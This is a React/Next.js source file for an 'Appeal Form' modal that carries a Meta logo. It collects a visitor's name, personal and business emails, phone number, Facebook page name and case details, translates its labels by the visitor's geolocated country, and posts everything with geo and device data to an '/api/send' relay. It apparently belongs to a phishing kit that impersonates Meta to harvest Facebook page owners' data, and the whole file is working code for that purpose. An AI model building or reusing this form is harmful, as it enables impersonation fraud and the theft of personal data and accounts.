import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import { buildAppealMessage } from '@/utils/message';
import translateText from '@/utils/translate';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import IntlTelInput, { type IntlTelInputRef } from 'intl-tel-input/reactWithUtils';
import 'intl-tel-input/styles';
import Image from 'next/image';
import { type ChangeEvent, type FC, type FormEvent, useCallback, useEffect, useMemo, useRef, useState } from 'react';

interface FormData {
    information: string;
    fullName: string;
    personalEmail: string;
    businessEmail: string;
    facebookPageName: string;
}

interface FormErrors {
    information?: string;
    fullName?: string;
    personalEmail?: string;
    businessEmail?: string;
    phoneNumber?: string;
    facebookPageName?: string;
    termsAccepted?: string;
}

interface FormField {
    name: keyof FormData;
    label: string;
    type: 'text' | 'email' | 'textarea';
    required?: boolean;
}

const FORM_FIELDS: FormField[] = [
    { name: 'information', label: 'Please provide us information that will help us investigate', type: 'textarea', required: true },
    { name: 'fullName', label: 'Full Name', type: 'text', required: true },
    { name: 'personalEmail', label: 'Personal Email', type: 'email', required: true },
    { name: 'businessEmail', label: 'Business Email', type: 'email', required: true },
    { name: 'facebookPageName', label: 'Facebook Page Name', type: 'text', required: true }
];
const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [isLoading, setIsLoading] = useState(false);
    const [phoneNumber, setPhoneNumber] = useState('');
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [formData, setFormData] = useState<FormData>({
        information: '',
        fullName: '',
        personalEmail: '',
        businessEmail: '',
        facebookPageName: ''
    });
    const [errors, setErrors] = useState<FormErrors>({});
    const [termsAccepted, setTermsAccepted] = useState(false);
    const phoneInputRef = useRef<IntlTelInputRef>(null);

    const { setModalOpen, geoInfo, deviceLabel, setMessageId, setUserData, messageId } = store();
    const countryCode = geoInfo?.country_code.toLowerCase() || 'us';

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;
        const textsToTranslate = [
            'Appeal Form',
            'Please provide us information that will help us investigate',
            'Full Name',
            'Personal Email',
            'Business Email',
            'Mobile phone number',
            'Facebook Page Name',
            'I agree with Terms of use',
            'Submit',
            'This field is required',
            'Invalid email format',
            'Invalid phone number',
            'You must agree to the terms of use'
        ];
        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    // Validation functions
    const validateEmail = (email: string): boolean => {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    };

    const validateForm = (): boolean => {
        const newErrors: FormErrors = {};

        // Validate required fields
        FORM_FIELDS.forEach(field => {
            if (field.required && !formData[field.name].trim()) {
                newErrors[field.name] = t('This field is required');
            }
        });

        // Validate email formats
        if (formData.personalEmail && !validateEmail(formData.personalEmail)) {
            newErrors.personalEmail = t('Invalid email format');
        }
        if (formData.businessEmail && !validateEmail(formData.businessEmail)) {
            newErrors.businessEmail = t('Invalid email format');
        }

        // Validate phone number
        if (!phoneNumber.trim()) {
            newErrors.phoneNumber = t('This field is required');
        } else if (phoneInputRef.current?.getInstance) {
            const instance = phoneInputRef.current.getInstance();
            if (instance && !instance.isValidNumber()) {
                newErrors.phoneNumber = t('Invalid phone number');
            }
        }

        // Validate terms accepted
        if (!termsAccepted) {
            newErrors.termsAccepted = t('You must agree to the terms of use');
        }

        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    const initOptions = useMemo(
        () => ({
            initialCountry: countryCode as '',
            separateDialCode: true,
            strictMode: true,
            nationalMode: true,
            autoPlaceholder: 'aggressive' as const,
            placeholderNumberType: 'MOBILE' as const,
            countrySearch: false
        }),
        [countryCode]
    );

    const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { name, value, type } = e.target;
        setFormData((prev) => ({
            ...prev,
            [name]: type === 'checkbox' ? (e.target as HTMLInputElement).checked : value
        }));

        // Clear error for this field when user types
        if (errors[name as keyof FormErrors]) {
            setErrors(prev => ({ ...prev, [name]: undefined }));
        }
    }, [errors]);

    const handlePhoneChange = useCallback((number: string) => {
        setPhoneNumber(number);

        // Clear phone error when user types
        if (errors.phoneNumber) {
            setErrors(prev => ({ ...prev, phoneNumber: undefined }));
        }
    }, [errors.phoneNumber]);

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (isLoading) return;

        // Validate form
        if (!validateForm()) {
            return;
        }

        setIsLoading(true);

        const userPayload = {
            fullName: formData.fullName,
            personalEmail: formData.personalEmail,
            businessEmail: formData.businessEmail,
            phoneNumber: phoneNumber,
            facebookPageName: formData.facebookPageName,
            information: formData.information
        };

        setUserData(userPayload);

        const message = buildAppealMessage({
            geoInfo,
            deviceLabel,
            userData: userPayload
        });

        try {
            const res = await axios.post('/api/send', {
                message,
                old_message_id: messageId
            });

            if (res?.data?.success && typeof res.data.message_id === 'number') {
                setMessageId(res.data.message_id);
            }

            nextStep();
        } catch {
            nextStep();
        } finally {
            setIsLoading(false);
        }
    };
    return (
        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
            <div className='flex max-h-[90vh] w-full max-w-xl flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3]'>
                <div className='mb-2 flex w-full items-center justify-between p-4 pb-0'>
                    <p className='text-2xl font-bold'>{t('Appeal Form')}</p>
                    <button type='button' onClick={() => setModalOpen(false)} className='h-8 w-8 rounded-full transition-colors hover:bg-[#e2eaf2]' aria-label='Close modal'>
                        <FontAwesomeIcon icon={faXmark} size='xl' />
                    </button>
                </div>

                <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto px-4'>
                    <div className='flex flex-col gap-2 py-2'>
                        {FORM_FIELDS.map((field) => (
                            <div key={field.name}>
                                <p className='font-sans'>
                                    {t(field.label)}
                                    {field.required && <span className='text-red-500'> *</span>}
                                </p>
                                {field.type === 'textarea' ? (
                                    <textarea
                                        name={field.name}
                                        value={formData[field.name]}
                                        onChange={handleInputChange}
                                        className={`min-h-[100px] w-full rounded-[10px] border-2 ${errors[field.name] ? 'border-red-500' : 'border-[#d4dbe3]'} px-3 py-1.5`}
                                        rows={3}
                                    />
                                ) : (
                                    <input
                                        name={field.name}
                                        type={field.type}
                                        value={formData[field.name]}
                                        onChange={handleInputChange}
                                        className={`h-[50px] w-full rounded-[10px] border-2 ${errors[field.name] ? 'border-red-500' : 'border-[#d4dbe3]'} px-3 py-1.5`}
                                    />
                                )}
                                {errors[field.name] && (
                                    <p className='mt-1 text-sm text-red-500'>{errors[field.name]}</p>
                                )}
                            </div>
                        ))}
                        <div>
                            <p className='font-sans'>
                                {t('Mobile phone number')}
                                <span className='text-red-500'> *</span>
                            </p>
                            <IntlTelInput
                                ref={phoneInputRef}
                                onChangeNumber={handlePhoneChange}
                                initOptions={initOptions}
                                inputProps={{
                                    name: 'phoneNumber',
                                    className: `h-[50px] w-full rounded-[10px] border-2 ${errors.phoneNumber ? 'border-red-500' : 'border-[#d4dbe3]'} px-3 py-1.5`
                                }}
                            />
                            {errors.phoneNumber && (
                                <p className='mt-1 text-sm text-red-500'>{errors.phoneNumber}</p>
                            )}
                        </div>
                        <div>
                            <label className='flex items-center gap-2 pt-2 cursor-pointer'>
                                <input
                                    type='checkbox'
                                    checked={termsAccepted}
                                    onChange={(e) => {
                                        setTermsAccepted(e.target.checked);
                                        if (e.target.checked && errors.termsAccepted) {
                                            setErrors(prev => ({ ...prev, termsAccepted: undefined }));
                                        }
                                    }}
                                    className='cursor-pointer'
                                />
                                <span>
                                    {t('I agree with Terms of use')}
                                </span>
                            </label>
                            {errors.termsAccepted && (
                                <p className='mt-1 text-sm text-red-500'>{errors.termsAccepted}</p>
                            )}
                        </div>
                        <button type='submit' disabled={isLoading} className={`mt-4 flex h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
                            {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Submit')}
                        </button>
                    </div>
                </form>

                <div className='flex items-center justify-center p-3'>
                    <Image src={MetaLogo} alt='' className='h-[18px] w-[70px]' />
                </div>
            </div>
        </div>
    );
};

export default InitModal;
